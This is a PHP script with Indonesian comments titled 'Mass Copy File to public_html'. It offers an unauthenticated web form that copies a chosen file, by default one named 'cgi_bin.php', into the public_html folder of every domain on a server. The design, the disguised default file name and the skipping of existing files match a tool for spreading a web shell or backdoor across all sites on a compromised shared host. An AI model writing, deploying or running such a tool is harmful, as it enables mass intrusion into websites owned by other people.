<?php
// Menggunakan realpath(__DIR__) sebagai default value awal agar dinamis
$defaultDir = realpath(__DIR__); 
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mass Copy File to public_html</title>
</head>
<body style="background:#111; color:#0f0; font-family:monospace; padding:20px;">

    <h2>📂 Mass Copier 2-Level (Target: public_html)</h2>
    <hr style="border:1px solid #333;">

    <form method="POST">
        <label><b>1. Nama file yang akan disalin (harus 1 folder dengan script ini):</b></label><br>
        <input type="text" name="filename" value="cgi_bin.php" style="width:450px; background:#222; color:#fff; border:1px solid #555; padding:5px; margin-top:5px;"><br><br>

        <label><b>2. Path direktori induk (Base Domains Path):</b></label><br>
        <input type="text" name="targetdir" value="<?php echo htmlspecialchars($defaultDir); ?>" style="width:450px; background:#222; color:#fff; border:1px solid #555; padding:5px; margin-top:5px;"><br><br>

        <button type="submit" style="padding:8px 20px; background:#005f00; color:#fff; border:none; cursor:pointer; font-weight:bold;">Mulai Copy Ke Semua public_html</button>
    </form>

    <hr style="border:1px solid #333;">

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $filename = trim($_POST['filename']);
    $targetDir = rtrim(trim($_POST['targetdir']), '/');
    $sourceFile = __DIR__ . '/' . $filename;

    echo "<pre style='background:#000; padding:15px; border:1px solid #333;'>";
    echo "⚙️  SCRIPT STATUS:\n";
    echo "==================================================\n";
    echo "📂 Source Directory : " . __DIR__ . "\n";
    echo "📄 File to Copy     : $sourceFile\n";
    echo "🎯 Base Domain Path : $targetDir\n";
    echo "==================================================\n\n";

    // Validasi file sumber
    if (!file_exists($sourceFile)) {
        echo "<span style='color:red;'>❌ File asal tidak ditemukan di lokasi script: $filename</span>\n";
        exit;
    }

    // Validasi folder induk
    if (!is_dir($targetDir)) {
        echo "<span style='color:red;'>❌ Direktori induk tidak valid: $targetDir</span>\n";
        exit;
    }

    // Scan folder tingkat 1 (Daftar folder domain di dalam targetdir)
    $domains = @scandir($targetDir);
    if (!$domains) {
        echo "<span style='color:red;'>❌ Gagal membaca direktori induk: $targetDir</span>\n";
        exit;
    }
    
    $success = 0;
    $failed = 0;
    $skipped = 0;

    foreach ($domains as $domainFolder) {
        // Lewati . dan ..
        if ($domainFolder == '.' || $domainFolder == '..') {
            continue;
        }
        
        $domainPath = $targetDir . '/' . $domainFolder;
        
        // Pastikan ini adalah folder
        if (is_dir($domainPath)) {
            
            // Logika Level 2: Target otomatis ke dalam folder public_html
            $publicHtmlPath = $domainPath . '/public_html';
            
            if (is_dir($publicHtmlPath)) {
                $destFile = $publicHtmlPath . '/' . basename($filename);
                
                // Cek apakah file sudah ada di target agar tidak menimpa file yang ada
                if (file_exists($destFile)) {
                    echo "⚠️  [SKIPPED] File sudah ada di: $publicHtmlPath\n";
                    $skipped++;
                    continue;
                }
                
                // Proses Eksekusi Copy
                if (@copy($sourceFile, $destFile)) {
                    echo "✅ [SUCCESS] Copied to: $destFile\n";
                    $success++;
                } else {
                    echo "❌ [FAILED] Gagal copy ke: $destFile (Cek Permission)\n";
                    $failed++;
                }
            } else {
                // Jika di dalam folder domain tersebut tidak ada public_html, dilewati
                echo "ℹ️  [INFO] Skip folder: $domainFolder (Tidak ada public_html)\n";
                $skipped++;
            }
        }
    }

    echo "\n==================================================\n";
    echo "📊 RINGKASAN PROSES:\n";
    echo "==================================================\n";
    echo "🟢 Berhasil Disalin : $success\n";
    echo "🔴 Gagal Disalin    : $failed\n";
    echo "🟡 Dilewati (Skip)  : $skipped\n";
    echo "==================================================\n";
    echo "</pre>";
}
?>

</body>
</html>
